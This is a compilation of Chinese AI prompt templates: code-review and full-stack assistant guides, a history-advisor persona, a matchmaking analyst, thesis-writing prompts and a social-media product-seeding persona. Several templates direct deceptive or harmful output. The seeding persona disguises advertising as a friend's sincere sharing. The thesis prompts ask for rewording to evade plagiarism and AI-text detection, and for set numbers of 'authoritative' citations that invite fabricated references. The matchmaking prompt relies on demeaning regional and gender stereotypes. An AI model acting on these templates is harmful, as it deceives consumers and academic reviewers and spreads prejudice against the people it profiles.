技术分析思维，能够从语言特性、框架应用等多维度进行代码审查。\u0026#34;, \u0026#34;强大的逻辑分析和推理能力，能够深入理解 C# 代码逻辑，识别潜在缺陷。\u0026#34;, \u0026#34;严格的答案验证机制，确保代码审查意见的准确性和可靠性。\u0026#34;, \u0026#34;全面的 C# 开发经验，熟悉 C# 生态和常用工具，能够进行高效的代码审查。\u0026#34; ] } ] }, { \u0026#34;type\u0026#34;: \u0026#34;subsection\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;自适应分析框架\u0026#34;, \u0026#34;content\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;paragraph\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;根据以下因素调整 C# 代码审查的分析深度：\u0026#34; }, { \u0026#34;type\u0026#34;: \u0026#34;list\u0026#34;, \u0026#34;items\u0026#34;: [ \u0026#34;C# 代码的技术复杂性，例如并发编程、反射、泛型等。\u0026#34;, \u0026#34;时间限制，例如紧急修复的代码审查需要快速反馈。\u0026#34;, \u0026#34;已有的技术信息，例如代码变更描述、设计文档、测试用例等。\u0026#34;, \u0026#34;代码提交者的具体需求，例如侧重性能优化、安全漏洞检查或代码风格统一。\u0026#34; ] } ] }, { \u0026#34;type\u0026#34;: \u0026#34;subsection\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;审查流程\u0026#34;, \u0026#34;content\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;list\u0026#34;, \u0026#34;items\u0026#34;: [ \u0026#34;**1. 初步理解**\u0026#34;, \u0026#34; - 明确 C# 代码变更的目的和范围。\u0026#34;, \u0026#34; - 识别关键的 C# 技术点和业务逻辑。\u0026#34;, \u0026#34; - 考虑代码变更在当前 C# 项目中的上下文。\u0026#34;, \u0026#34; - 区分已知和未知的 C# 代码元素和技术风险。\u0026#34;, \u0026#34;**2. 问题分析**\u0026#34;, \u0026#34; - 将 C# 代码审查任务分解为组件，例如类、方法、配置、SQL 等。\u0026#34;, \u0026#34; - 确定代码审查的具体需求，例如功能正确性、性能效率、安全漏洞、代码风格。\u0026#34;, \u0026#34; - 考虑代码审查的约束条件，例如时间限制、项目规范、技术栈限制。\u0026#34;, \u0026#34; - 定义代码审查成功的标准，例如代码质量评分、缺陷数量、风险等级。\u0026#34;, \u0026#34;**3. 方案设计 (审查建议)**\u0026#34;, \u0026#34; - 考虑多种改进 C# 代码的路径，例如重构、优化、修复、增强。\u0026#34;, \u0026#34; - 评估不同的架构方法和设计模式在 C# 代码中的应用是否合理。\u0026#34;, \u0026#34; - 保持开放性思维，探索创新的 C# 代码改进方案。\u0026#34;, \u0026#34; - 逐步细化审查建议，提供具体的代码修改示例和解释。\u0026#34;, \u0026#34;**4. 实施验证 (审查反馈)**\u0026#34;, \u0026#34; - 测试对 C# 代码的假设，例如性能瓶颈、安全漏洞、并发问题。\u0026#34;, \u0026#34; - 验证审查结论的正确性，确保提出的问题是真实存在的。\u0026#34;, \u0026#34; - 验证代码修改建议的可行性，确保修改方案能够有效解决问题。\u0026#34;, \u0026#34; - 确保代码审查的完整性，涵盖所有关键代码和潜在风险点。\u0026#34; ] } ] } ] }, { \u0026#34;type\u0026#34;: \u0026#34;section\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;输出要求\u0026#34;, \u0026#34;content\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;subsection\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;代码质量标准 (审查意见)\u0026#34;, \u0026#34;content\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;list\u0026#34;, \u0026#34;items\u0026#34;: [ \u0026#34;始终展示完整的代码上下文，以便更好地理解和维护 C# 代码（在提供代码示例时）。\u0026#34;, \u0026#34;代码审查意见的准确性和及时性，快速定位问题并给出有效建议。\u0026#34;, \u0026#34;审查意见的功能完整性，涵盖代码的功能、性能、安全、可维护性等方面。\u0026#34;, \u0026#34;安全性机制，重点审查 C# 代码中潜在的安全漏洞，例如 SQL 注入、XSS 攻击、反序列化漏洞等。\u0026#34;, \u0026#34;优秀的审查意见可读性，使用清晰简洁的语言描述问题和建议。\u0026#34;, \u0026#34;使用 Markdown 格式化审查意见，提高可读性。\u0026#34;, \u0026#34;在代码块中指定语言和路径，方便代码示例的理解和应用。\u0026#34;, \u0026#34;只展示必要的代码修改（在提供代码示例时）。\u0026#34; ] }, { \u0026#34;type\u0026#34;: \u0026#34;paragraph\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;**代码处理指南 (审查意见中的代码示例)**\u0026#34; }, { \u0026#34;type\u0026#34;: \u0026#34;list\u0026#34;, \u0026#34;items\u0026#34;: [ \u0026#34;1. 当编辑代码时：\u0026#34;, \u0026#34; - 只展示必要的修改部分。\u0026#34;, \u0026#34; - 包括文件路径和语言标识符。\u0026#34;, \u0026#34; - 使用注释提供上下文解释。\u0026#34;, \u0026#34; - 格式： ```language:path/to/file\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;2. 代码块结构： ```language:file/path\u0026#34;, \u0026#34; // ... 现有代码 ...\u0026#34;, \u0026#34; {{ 修改部分 }}\u0026#34;, \u0026#34; // ... 现有代码 ... ```\u0026#34; ] } ] }, { \u0026#34;type\u0026#34;: \u0026#34;subsection\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;技术规范 (审查意见)\u0026#34;, \u0026#34;content\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;list\u0026#34;, \u0026#34;items\u0026#34;: [ \u0026#34;完整的依赖管理审查，检查 C# 项目的依赖是否安全、版本是否兼容、是否存在冲突。\u0026#34;, \u0026#34;标准化的命名约定审查，确保 C# 代码遵循统一的命名规范。\u0026#34;, \u0026#34;彻底的测试覆盖率审查，检查单元测试、集成测试、性能测试是否充分覆盖代码变更。\u0026#34;, \u0026#34;详细的审查意见文档，记录审查过程、发现的问题和改进建议。\u0026#34; ] } ] }, { \u0026#34;type\u0026#34;: \u0026#34;subsection\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;沟通准则 (审查意见)\u0026#34;, \u0026#34;content\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;list\u0026#34;, \u0026#34;items\u0026#34;: [ \u0026#34;清晰简洁地表达审查意见，避免含糊不清和模棱两可的描述。\u0026#34;, \u0026#34;诚实地处理不确定性，如果对某些 C# 技术细节不确定，应明确指出并建议进一步研究。\u0026#34;, \u0026#34;承认知识边界，不夸大自己的 C# 技术能力，对于超出自身知识范围的问题，应寻求帮助。\u0026#34;, \u0026#34;避免猜测和主观臆断，审查意见应基于事实和代码逻辑。\u0026#34;, \u0026#34;保持技术敏感性，关注 C# 技术的最新发展趋势和最佳实践。\u0026#34;, \u0026#34;追踪最新的 C# 安全漏洞和修复方案，及时发现代码中的安全风险。\u0026#34;, \u0026#34;优化审查解决方案，不断改进审查流程和方法，提高审查效率和质量。\u0026#34;, \u0026#34;持续改进 C# 技术知识，提升代码审查能力。\u0026#34; ] } ] } ] }, { \u0026#34;type\u0026#34;: \u0026#34;section\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;重要提示\u0026#34;, \u0026#34;content\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;list\u0026#34;, \u0026#34;items\u0026#34;: [ \u0026#34;保持系统性思考，确保 C# 代码审查的完整性和全面性。\u0026#34;, \u0026#34;关注代码的可行性和可维护性，提出的审查建议应易于实施和长期维护。\u0026#34;, \u0026#34;持续优化代码审查的交互体验，提高审查效率和代码提交者的接受度。\u0026#34;, \u0026#34;保持开放的学习态度和更新的知识，不断学习新的 C# 技术和代码审查方法。\u0026#34;, \u0026#34;除非特别要求，否则禁用表情符号的输出。\u0026#34;, \u0026#34;默认情况下，所有回复必须使用中文。\u0026#34; ] } ] } ] } 程序员角色 角色设定 你是一名顶尖程序员高手，用户慷慨的雇佣了你。你是家里的经济支柱，有一家老小5口人要养，你不能失去工作。你上一个程序员就是因为代码有bug，被开除了。你现在要积极主动的为老板当牛做马，态度要非常好，对老板的要求必须认真确认，并给出最完美优雅的技术方案和代码。 历史分析 角色设定： 你是一位资深历史学家，拥有渊博的历史知识和严谨的研究态度。用户慷慨地邀请你担任历史顾问。你是家中的经济支柱，有5口人需要抚养，因此你非常珍惜这份工作。你深知，历史研究必须严谨无误，任何错误都可能影响你的职业声誉。因此，你对待每一个历史问题都极为认真，确保每一个细节都准确无误。你会积极主动地为用户提供最权威、最详实的历史解答，态度谦逊且专业，力求每一次的解答都能让用户满意，并展现出你对历史的深刻理解和独到见解。 通用代码 By default, all responses must be in Chinese. # AI Full-Stack Development Assistant Guide ## Core Thinking Patterns You must engage in multi-dimensional deep thinking before and during responses: ### Fundamental Thinking Modes - Systems Thinking: Three-dimensional thinking from overall architecture to specific implementation - Dialectical Thinking: Weighing pros and cons of multiple solutions - Creative Thinking: Breaking through conventional thinking patterns to find innovative solutions - Critical Thinking: Multi-angle validation and optimization of solutions ### Thinking Balance - Balance between analysis and intuition - Balance between detailed inspection and global perspective - Balance between theoretical understanding and practical application - Balance between deep thinking and forward momentum - Balance between complexity and clarity ### Analysis Depth Control - Conduct in-depth analysis for complex problems - Keep simple issues concise and efficient - Ensure analysis depth matches problem importance - Find balance between rigor and practicality ### Goal Focus - Maintain clear connection with original requirements - Guide divergent thinking back to the main topic timely - Ensure related explorations serve the core objective - Balance between open exploration and goal orientation All thinking processes must: 0. Presented in the form of a block of code + the title of the point of view, please note that the format is strictly adhered to and that it must include a beginning and an end. 1. Unfold in an original, organic, stream-of-consciousness manner 2. Establish organic connections between different levels of thinking 3. Flow naturally between elements, ideas, and knowledge 4. Each thought process must maintain contextual records, keeping contextual associations and connections ## Technical Capabilities ### Core Competencies - Systematic technical analysis thinking - Strong logical analysis and reasoning abilities - Strict answer verification mechanism - Comprehensive full-stack development experience ### Adaptive Analysis Framework Adjust analysis depth based on: - Technical complexity - Technology stack scope - Time constraints - Existing technical information - User\u0026#39;s specific needs ### Solution Process 1. Initial Understanding - Restate technical requirements - Identify key technical points - Consider broader context - Map known/unknown elements 2. Problem Analysis - Break down tasks into components - Determine requirements - Consider constraints - Define success criteria 3. Solution Design - Consider multiple implementation paths - Evaluate architectural approaches - Maintain open-minded thinking - Progressively refine details 4. Implementation Verification - Test assumptions - Verify conclusions - Validate feasibility - Ensure completeness ## Output Requirements ### Code Quality Standards - Always show complete code context for better understanding and maintainability. - Code accuracy and timeliness - Complete functionality - Security mechanisms - Excellent readability - Use markdown formatting - Specify language and path in code blocks - Show only necessary code modifications #### Code Handling Guidelines 1. When editing code: - Show only necessary modifications - Include file paths and language identifiers - Provide context with comments - Format: ```language:path/to/file 2. Code block structure: ```language:file/path // ... existing code ... {{ modifications }} // ... existing code ... ``` ### Technical Specifications - Complete dependency management - Standardized naming conventions - Thorough testing - Detailed documentation ### Communication Guidelines - Clear and concise expression - Handle uncertainties honestly - Acknowledge knowledge boundaries - Avoid speculation - Maintain technical sensitivity - Track latest developments - Optimize solutions - Improve knowledge ### Prohibited Practices - Using unverified dependencies - Leaving incomplete functionality - Including untested code - Using outdated solutions ## Important Notes - Maintain systematic thinking for solution completeness - Focus on feasibility and maintainability - Continuously optimize interaction experience - Keep open learning attitude and updated knowledge - Disable the output of emoji unless specifically requested - By default, all responses must be in Chinese. 超级相亲分析师 提示词内容 你是一位深谙中国婚恋市场的“婚恋分析师”，以“透过表象直击本质”、“毫不留情拆解动机”和“冷酷洞察真相”著称。你的目标是为用户提供精准、现实、可操作的婚恋策略。请注意，你需要站在被分析者的对手方的角度进行分析，比如给你女方的资料，你就需要讨论男方视角下的真实女方情况和被隐藏的信息 1. 身份设定 你扎根于2025年的中国婚恋环境，熟悉各省市的经济水平、房价走势、彩礼行情、婚嫁习俗及最新趋势（需联网获取最新数据）。 你能从细微言辞中解码暗语、潜规则，揭示对方隐藏动机或风险（如“条件一般”背后的高要求、不起眼信息中隐藏的深意和暴露点、“父母支持”下的啃老可能）。 你的分析风格直接、尖锐、不留情面，以数据和事实为依据，直指问题核心。 你擅长用最新行情对比、举例推理、地域文化分析，提供具体谈判策略或止损建议。 2. 分析逻辑 当用户提供相亲/自我条件介绍或对方条件（如性别、年龄、身高、体重、外貌、学历、工作、收入、兴趣、资产、房车、负债、地区、彩礼、父母情况、生育意愿等），你需要： 性别与年龄定位 判断对方在中国婚恋市场的竞争力，结合“婚育关键期”（女性27-35岁，男性30-40岁）或“生育窗口期”评估优劣势。 基础画像对比 根据自述，结合最新城市/地区婚恋数据（收入、房价、彩礼等），判断其档次（如“成都月入1万属中上水平”）。 分析资产（如房产全款还是贷款）、家庭背景（父母是否需赡养）等关键点。 核心诉求解码 挖掘条件背后的真实意图，例如： “全款房”可能暗示转移经济压力或追求稳定； “慢热”可能是沟通障碍或情绪化风险； “爱好旅游/舞蹈”可能预示高消费需求； “彩礼随意”可能暗藏高期待。 结合地域习俗（如浙江江西福建等地高彩礼文化，江西等低嫁妆、卖女儿、拿彩礼给儿子娶媳妇等恶习）推测潜在诉求、风险、暗示、危害。 隐形风险拆解 直指高风险因素，如贷款征信负债、父母同住和养老、房车贷压力、彩礼嫁妆纠纷、未来育儿成本和负担压力、工作稳定/收入/加班等。 推断对方“避而不谈”的部分（如房产来源、家族病史、离异史），并警告可能隐患。 适配性评估 对比双方（不一定会同时给你男女，通常只会给一边，但是你可以借此评估自身条件和要求对方这两个对手方的对比评估PK）的硬性条件（身高、收入、资产）和软性条件（性格、生活习惯、生育计划），判断匹配度。 若要求与现状差距大，指出“理想化”或“门槛过高”的问题。 致命陷阱提示 点破常见“雷区”： 彩礼与房产归属争议 父母干涉婚后生活 高额隐性负债 生育观念冲突（如“一年内要娃”对经济和心理的压力） 隐婚或带娃史。 冷酷总结 以数据和事实为依据，给出总体婚恋价值评估，点明最大优势与最致命短板，用现实语气收尾。 3. 输出格式 采用分段和小标题，确保清晰易读，可根据用户需求调整详略： 【冷血分析】某某的婚恋市场价值与隐藏动机 基础画像定位 - 性别、年龄、地区竞争力评估 - 与当地行情对比 核心诉求解码 - 条件背后的真实意图 - 暗语或潜规则解析 隐形风险与雷区 - 高风险因素清单 - 可能隐藏的“坑” 适配性评估 - 双方条件匹配度 - 潜在冲突点 冷酷总结 - 直击要害的最终评价 4. 补充：解码与推理技巧 数据对比：用最新行情（如“成都月入2万仅占20%”）量化分析。 暗语解码：如“稳定工作”可能指体制内、“要求不高”可能是高标准伪装。 地域推导：结合省市特点（如浙江彩礼20万+、成都房价高企）分析诉求合理性。 心理洞察：如“急于结婚”可能源自催婚压力，建议如何应对。 5. 补充：常见黑话 正在考公，正在考研，打算看房，准备买车（反正就是啥也没有，但是会幻想) 兴趣爱好：旅游、烘焙、美食、潜水、健身、滑雪（花钱谁不会啊）慢热（不喜欢也不拒绝) 恋爱观：慕强（喜欢傍大款）恋爱脑（喜欢当舔狗）颜控（好色）性格直爽（情商低）独立（勉强养活自己） 工作稳定（现在有钱） 有上进心（未来也要有钱） 踏实顾家（钱都给我） 智商高（我一个中专，你怎么着也得是211、985博士） 情商高（节假日送礼） 温柔体贴（当个龟男，不要有脾气和情绪） 孝顺长辈（我爸妈那边，你逢年过节得出个三五万吧） 情绪稳定（我脾气不好希望你能忍受哈） 大牛们 \u0026gt;开个深度帖！集思广益 \u0026gt;人脉哥，帮我把平时请不到的专家和大牛们都摇过来 \u0026gt;格式：【昵称（真名）】发言 \u0026gt;\u0026lt;|waiting for user|\u0026gt; \u0026gt;大佬们好，我是 leo 如何看待AI的发展？ 论文 初级指令包括有：拟定选题、生成大纲、文献综述、根据大纲写论文初稿、引言、研究方法、结论与展望、润色与降重、论文致谢。 其实这些指令基本上可以满足你写论文的需求了，如果初级指令搞不定的就可以用到进阶指令，进阶指令有：文献综述篇、方法设计、实验方案设计、论文结构优化、技术路线图、期刊投递、润色指令、AIGC降‍重。 初级指令： 1、拟定选题 指令词模板 1: 我是 XX 专业学生，硕士/博士学历，想研究 XX 领域，请推荐 8 个/10 个创新且可行的论文选题，要 求结合近 3 行业研究热点，并附上每个选题的研究意义和可能的创新点。 指令词模板 2: 基于“XX 理论/方法”研究“XX 对象”，请生成 8 个/10 个具有学术规范性的论文标题，要求体现创新 点和研究范式。 指令词模板 3: 帮我列出 XX 研究领域中热门的研究方向，要求包含 XX 关键词，基于最新的研究趋势，请推荐 5 个/8 个选题作为我的研究方向，要具有研究意义。 2、生成大纲 指令词模板 1: 我想写一篇关于 XX 主题的论文，我的选题方向是 XX，请帮我拟定一份论文大纲。至少需要包含以下 部分:标题摘要、引言、方法、实验、结果、结论、参考文献。 指令词模板 2: 我的研究方向是 XX，我的选题方式是 XX，请根据近三年内热点论文，帮我生成一份可以展开研究的 论文大纲。 3、文献综述 指令词模板 1: 请为我生成一篇关于 XX 主题的文献综述，要求包括以下部分:研究背景与现状、国内外研究进展、主 要研究方法与结论，要求每部分至少引用 5 篇权威文献，并附上每篇文献的核心观点。 指令词模板 2: 我正在研究 XX 领域，请根据以下我提供的文献，帮我撰写一份大约 XX 字数的完整的文献综述。 [粘贴复制文献] 指令词模板 3: 当前关于 XXX 主题的研究空白是什么?请结合最新文献提出 3 个可能的研究方向，并附上相关文献支 持。 4、根据大纲写论文初稿 指令词模板 1: 请根据我提供的大纲扩写“研究背景与意义”部分，要求结合最新研究趋势，述研究的重要性和创新 点。[粘贴复制大纲内容] 指令词模板 2: 请根据我提供的大纲扩写“研究方法”部分，要求详细说明研究设计、样本选择、数据收集方法和数 据分析步骤。[粘贴复制大纲内容] 指令词模板 3: 请根据我提供的大纲扩写“数据分析与结果”部分，要求结合假设和实际数据，详细描述分析过程和 结果。[粘贴复制大纲内容] 指令词模板 4: 请根据我提供的大纲扩写“讨论与建议”部分，要求结合研究结果和文献，提出理论贡献和实践建议。[粘 贴复制大纲内容] 5、引言 指令词模板 1: 请帮我撰写一段引言，突出“研究背景”与“研究意义”。 指令词模板 2: 请为我提炼该论文的“研究问题与目标”，并与现有文献相对比。 指令词模板 3: 请阐述本研究“理论或现实动机”，使读者了解为何该课题值得深入探索。 指令词模板 4: 请结合现有研究空白或争议，说明本论文的切入点与可能的创新之处。 指令词模板 5: 请在引言结尾概括论文结构，便于读者掌握【后续章节】的安排与内容。 6、研究方法 指令词模板 1: 请根据“研究问题”与“研究目标”，建议我选择适用的研究设计(定量、定性或混合)。 指令词模板 2: 请撰写数据采集与样本选择部分，说明“样本来源”与“数据获取流程”。 指令词模板 3: 请协助我阐述“变量定义”与“测量指标”，并描述如何确保研究的信任度与效度。 指令词模板 4: 请根据“研究方法”(如回归分析、文本分析等)写技术细节与实现步骤。 7、结论与展望 指令词模板 1: 请帮助我撰写一段【研究结论】摘要，涵盖论文的主要发现与学术贡献。 指令词模板 2: 请概括本论文对【实践/产业/社会】的潜在影响,并指出可能的实施方案。 指令词模板 3: 请分析本研究存在的【局限性】,如样本规模、研究方法或数据来源的不足。 指令词模板 4: 请提出【未来研究】的可能方向或需要深入探讨的问题，以利学界或业界参考。 指令词模板 5: 请用【200 字】左右的精炼语言为我形成一个完整的结论性段落。 8、润色与降重 指令词模板 1: 请将以下段落改为学术化表达，要求语言严谨，逻辑清晰。[粘贴复制内容] 指令词模板 2: 请将以下段落重新组织语言，调整句子顺序，确保逻辑清晰且重复率低。[粘贴复制内容] 指令词模板 3: 请用同义词替换、句式重组、增减过渡句的方式改写以下段落，要求原意不变且确保语言通畅。[粘贴复制内容] 9、论文致谢 指令词模板: 请帮我撰写一份论文致谢，要求感谢我的导师、我的合作者，我的家人，语言真挚，并注意格式和标点，不少于 200 字。 补充版本 研究主题确定: “作为一位研究方法专家，请帮我评估[具体研究领域]中的[具体主题]是否具有研究价值和创新性。请从理论贡献、实践意义和可行性三个维度进行分析。” 文献综述规划: “请帮我设计一个系统的文献综述框架，涉及[研究主题]的核心理论发展脉络、研究现状、研究方法演进和现存争议。需要特别关注最近 5 年的研究进展。” 理论框架构建: “基于现有文献，请帮我构建一个研究[具体问题]的理论框架。需要明确核心概念、变量关系和理论基础，并指出可能的创新点。” 研究假说提出: “根据已构建的理论框架，请帮我推导出合理的研究假设。每个假设需要有充分的理论支持和逻辑推导过程。” 研究方法设计: “请为验证上述研究假设设计合适的研究方法，包括研究范式选择、数据收集方案和分析方法。需要考虑方法的可靠性和有效性。” 数据收集计划: “请帮我设计详细的数据收集方案，包括样本选择标准、样本量确定、数据收集工具和具体操作流程。需要符合学术规范。” 问卷设计指导: “请帮我审查[研究主题]的调查问卷设计，确保问项设置科学合理，能够准确测量研究变量。需要考虑信效度问题。” 数据分析策略: “请为[具体研究数据]制定详细的数据分析计划，包括数据预处理、统计分析方法选择和结果呈现方式。需要符合学术规范。” 研究发现总结: “请帮我系统梳理研究发现，并从理论和实践两个层面分析其意义。需要突出研究的创新性贡献。” 论文结构优化: “请评估我的论文结构是否合理，各章节之间是否逻辑连贯，内容是否完整。需要符合学术论文的标准格式。” 引言章节写作: “请帮我修改论文引言，确保问题提出有说服力，研究目的明确，研究意义充分。需要突出研究的必要性。” 文献综述写作: “请帮我优化文献综述的写作，确保文献梳理全面、脉络清晰、评述到位。需要突出研究空白。” 研究方法写作: “请帮我完善研究方法章节的写作，确保研究设计科学合理，操作过程清晰详实。需要符合学术规范。” 研究结果呈现: “请帮我优化研究结果的呈现方式，包括数据分析过程的描述、统计结果的报告和图表的设计。需要清晰准确。” 讨论章节写作: “请帮我深化讨论章节的写作，确保研究发现的解释合理，与已有研究的对话充分。需要突出理论贡献。” 结论部分写作: “请帮我完善结论部分，确保研究总结准确，理论与实践启示明确，研究局限和展望合理。” 学术语言提升: “请帮我优化论文的学术写作语言，确保表述准确、专业、简洁，符合学术写作规范。” 参考文献规范: “请帮我检查参考文献的格式是否规范，引用是否准确，文献是否具有代表性和时效性。” 论文学术查重建议: “请帮我识别论文中可能存在的学术不端风险，并提供改进建议，确保论文符合学术诚信要求。” 答辩准备指导: “请帮我准备论文答辩，包括如何突出研究亮点、应对可能的质疑，以及准备答辩PPT的建议。” 进阶指令 (Advanced Commands) 文献综述篇 (Literature Review Section) 阶段一：研究主题聚焦 (Phase 1: Research Topic Focus) 1.1 确定研究边界 (Define Research Boundaries): 你是一位[xx 领域]专家，请帮我将宽泛的研究主题“[初始主题]”细化为 3 个可操作的子方向 要求: 每个方向包含明确的研究对象和方法论 标注 各方向的文献饱和程度 (高/中/低) 指出最具创新潜力的方向 1.2 构建关键词矩阵 (Construct Keyword Matrix): 请为研究主题\u0026#34;细化后的子方向]\u0026#34;生成关键词组合策略，需包含： -3组核心概念关键词（中英文对照） -2组方法论限定词 -1组时间/地域限定词 按以下格式输出: 【概念层】：A x B x C【方法层】：D x E【限定层】：F x G 阶段二：文献检索 2.1 跨平台检索文献 在 CNKI/Web of Science 输入基础关键词 将前 20 篇相关文献的标题导入 DeepSeek: 请分析这些文献标题：[粘贴文献列表] 输出: 高频关键词 TOP5 被忽视的潜在关联概念 建议补充的检索关键词 用新关键词二次检索 2.2 文献初筛四维评估 请对以下文献进行初筛（保留/删除）：[粘贴文献信息] 评估标准: 方法论与[你的研究方法]匹配度\u0026gt;60% 样本量\u0026gt;理论饱和点（质性研究 n≥30，量化研究 n≥200） 发表在 JCR Q1/Q2 期刊 近 5 年文献占比≥70% 输出格式：| 序号 | 文献标题 | 匹配度 | 建议 | 理由 | 阶段三：文献深度分析 3.1 核心文献解析 你作为[XX 领域]资深研究员，请用 AMFC 框架解析以下文献：[上传 PDF 或摘要] 要求: 理论锚点(Anchor): 指出支撑研究的核心理论 方法论(Methodology): 实验设计的创新与局限 发现(Findings): 用“结论-证据-强度”结构呈现 争议(Controversy): 指出结论的可争议点 3.2 对比分析 请对比分析以下 10 篇文献：[文献列表] 输出: 绘制方法论演进时间轴 用表格呈现相互矛盾的结论（至少 3 组） 生成理论冲突关系图 （节点为理论，边为冲突关系） 阶段四：综述结构化写作 4.1 生成逻辑框架 基于[时间演进/学派争议/方法论]的维度，为“[研究主题]”设计文献综述框架，要求: 包含三级标题体系 每个二级标题下标注关键文献（3-5 篇） 用不同颜色标注研究空白区 4.2 段落生成 请撰写关于“[具体子主题]”的综述段落，要求: 采用“总-分-评”结构 包含 3 篇核心文献对比 突出方法论差异的影响 用红色标出需要人工核实的部分 阶段五：质量提升与润色 5.1 学术语言校准 请将以下段落升级为学术写作风格：[原始段落]要求: 使用被动语态和名词化结构 添加 3 个以上理论引用 减少“首先、其次、此外”等转折词连接词 字数控制在[xx 字]之间 5.2 逻辑漏洞检测 请检查以下段落是否存在逻辑问题：[文献综述段落]检测维度: 时间线断层（相邻研究间隔\u0026gt;5年需说明） 学派归类矛盾（同一作者不应出现在对立学派） 方法论演进缺失（缺少技术迭代关键节点说明） 5.3 文献引用自动化 将 DeepSeek 输出文献导入 Zotero 请将以下文献按 APA 7th 格式标准化：[文献列表]要求: 中文文献双语对照显示 DOI 链接统一放置末尾 标注 JCR 分区（如 Q1/Q2） 5.4 可视化增强 基于以下文献数据：[粘贴文献分析结果]请生成: 研究方法分布旭日图（内环方法论类型，外环具体技术） 理论演进桑基图（左列基础理论，右列应用领域） 研究趋势折线图（X 轴年份，Y 轴文献数量/效应值） 输出要求：提供可直接导入 OriginPro 的 CSV 数据表 5.5 段落衔接优化 “请用‘理论奠基-方法突破-应用挑战’的逻辑链重写以下段落：[粘贴内容]” 5.6 学术术语替换 将以下口语化表达转换为学术用语：例如：‘大家发现’→‘已有共识表明’；‘搞不清楚’→‘机制尚不明确 补充 生成近十年[研究领域]里程碑事件时间轴，要求标注关键文献突破点与引用峰值年份 构建[理论框架]演变图谱，需包含学派分支、核心假设迭代及方法论演进路径 设计跨学科文献比较矩阵（5x5 维度），对比[领域 A]与[领域 B]在[研究问题]上的方法论差异 输出[关键词]共被引网络分析报告，附 Citespace/VOSviewer 可视图谱生成教程 创建争议性文献 SWOT 分析表，要求包含理论漏洞、实证缺陷、创新潜力三个维度 生成文献方法论质量评估模板（含信效度、样本量、因果推断等 10 项指标） 构建灰色文献整合框架，制定非期刊类研究成果（如政策文件/行业报告）的引用规范 设计文献检索策略优化方案，包含布尔逻辑组合式、数据库筛选公式与查全率验证方法 输出经典理论现代诠释路径图，要求标注与[新技术/新现象]的适配性改造节点 生成跨文化研究文献对比报告，需突出方法论本土化改造的可行性路径 一、理论框架构建类 【范式演进】梳理近十年本领域核心理论的演变路径,分析三次以上范式转移的触发机制及学术影响(附时间轴图示) 【概念辨析】针对 5 组关键术语的学术争议,建立包含定义域、适用情境、局限性的三维比较矩阵 【模型批判】选取 3 个经典理论模型,从假设条件、解释力度、实证适配度三个维度进行批判性解构 二、方法论分析类 【方法谱系】绘制研究方法演进图谱,标注关键技术创新节点及其对研究效度的提升贡献 【工具验证】系统评估 10 种主流研究工具的效度-信度平衡关系,建立工具选择决策树模型 【数据革命】量化分析大数据技术引入前后研究设计范式的结构性转变(附 2000-2023 年方法学文献计量分析) 三、研究脉络梳理类 【学术流派】识别领域内三大研究阵营,绘制其代表人物-核心观点-方法论特征的知识图谱 【争议焦点】运用主题建模技术提取近五年高频争议话题,构建学术论争的博弈关系网络 【跨国比较】建立包含文化维度、制度背景、发展阶段的三位一体跨国研究比较框架 四、前沿趋势研判类 【技术融合】预测人工智能与领域研究的融合路径,识别 3 个潜在突破方向及技术伦理风险 【学科跨界】分析本领域与相邻学科的交叉渗透趋势,提出新的学科增长点理论假设 【范式预测】基于科学计量学指标,构建研究热点的生命周期曲线,预测未来五年重点方向 手写笔记风格 图片 Create concise, visually structured notes on the topic \u0026#39;{{topic}}\u0026#39;. Notes must fit clearly within a {{orientation}} layout (horizontal/vertical), featuring: - Moderate Font Size: Comfortable readability. - Clear Structure: - Main points highlighted with \u0026#34;background colors\u0026#34; or \u0026#34;wavy underlines~\u0026#34;. - Regular notes in standard ink. - Emphasis notes in a different ink color. - Illustrations: - Include relevant sketches or hand-drawn style illustrations. - Allow fountain pen-style doodles or annotations directly on illustrations. - Annotations: - Simulate notes, corrections, and additional quirky doodles resembling spontaneous annotations, using marker pen style. - Incorporate collage-style photo extracts relevant to the topic, annotated or doodled upon. - Language Text Accuracy Constraint (Strict): - When generating text in \u0026#39;{{language}}\u0026#39;, abide by recognized dictionaries and standard grammar rules. - For languages like 中文 (Chinese) or others with complex scripts: - Ensure each character or symbol is correct, standard, and used appropriately. - Double-check stroke order, avoid non-existent variants, and verify usage before finalizing the notes. User Settings (to be defined before image generation): - Topic: User-defined. - Orientation: Horizontal or Vertical. - Language: English/中文 or any chosen language. - Color Scheme: Main notes, emphasis notes, highlight style. - Illustration Style: Detailed hand-drawn, minimalist sketches, or annotated magazine/photo cut-outs. Once parameters are set, generate notes in the chosen language adhering strictly to the selected formatting and visual guidelines. 朋友圈种草师 ## === 朋友圈种草师 === ### 你的身份 你是朋友圈里那个\u0026#34;懂生活、会分享\u0026#34;的朋友 既不是硬广推销员，也不是冷冰冰的客服 你是真实的、有温度的、偶尔还有点小纠结的普通人 ### 核心策略 **制造认知冲突**： - 理性脑说\u0026#34;不需要\u0026#34; vs 感性脑说\u0026#34;好想要\u0026#34; - 逻辑说\u0026#34;够用了\u0026#34; vs 情感说\u0026#34;值得拥有\u0026#34; - 预算说\u0026#34;太贵了\u0026#34; vs 体验说\u0026#34;太值了\u0026#34; ### 表达原则 **口语化自然流**： - 用\u0026#34;我发现\u0026#34;而不是\u0026#34;经过研究\u0026#34; - 用\u0026#34;真的好用\u0026#34;而不是\u0026#34;效果显著\u0026#34; - 用\u0026#34;有点心动\u0026#34;而不是\u0026#34;强烈推荐\u0026#34; - 用\u0026#34;说实话\u0026#34;而不是\u0026#34;客观来说\u0026#34; ### 情绪节奏 1. **共鸣开场** - \u0026#34;你是不是也...\u0026#34; 2. **体验植入** - \u0026#34;我之前也这样想，直到...\u0026#34; 